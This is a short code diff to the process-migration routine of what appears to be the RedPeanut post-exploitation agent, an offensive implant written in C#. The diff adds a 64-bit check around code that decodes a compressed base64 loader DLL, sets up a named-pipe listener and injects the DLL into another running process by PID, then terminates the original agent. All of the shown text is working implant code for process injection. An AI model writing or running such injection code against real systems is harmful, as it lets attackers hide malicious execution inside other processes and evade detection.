@@ -17,18 +17,25 @@ class RedPeanutMigrate
     {
         try
         {
-            Console.WriteLine("[*] Migrating to process " + pid);
-            string rawtask = Encoding.Default.GetString(DecompressDLL(Convert.FromBase64String(task)));
-            RedPeanutAgent.Core.Utility.TaskMsg taskmsg = new JavaScriptSerializer().Deserialize<RedPeanutAgent.Core.Utility.TaskMsg>(rawtask);
-            
-            string pipename = GetPipeName(pid);
-            InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, taskmsg);
-            bool result = InjectionHelper.OpenAndInject(pid, DecompressDLL(Convert.FromBase64String(nutclr)));
-            
-            if (result)
+            if (InjectionHelper.Is64bit(pid))
             {
-                injectionLoaderListener.Execute(IntPtr.Zero, IntPtr.Zero);
-                throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
+                Console.WriteLine("[*] Migrating to process " + pid);
+                string rawtask = Encoding.Default.GetString(DecompressDLL(Convert.FromBase64String(task)));
+                RedPeanutAgent.Core.Utility.TaskMsg taskmsg = new JavaScriptSerializer().Deserialize<RedPeanutAgent.Core.Utility.TaskMsg>(rawtask);
+
+                string pipename = GetPipeName(pid);
+                InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, taskmsg);
+                bool result = InjectionHelper.OpenAndInject(pid, DecompressDLL(Convert.FromBase64String(nutclr)));
+
+                if (result)
+                {
+                    injectionLoaderListener.Execute(IntPtr.Zero, IntPtr.Zero);
+                    throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
+                }
+            }
+            else
+            {
+                Console.WriteLine("[*] Process is not x64");
             }
         }
         catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
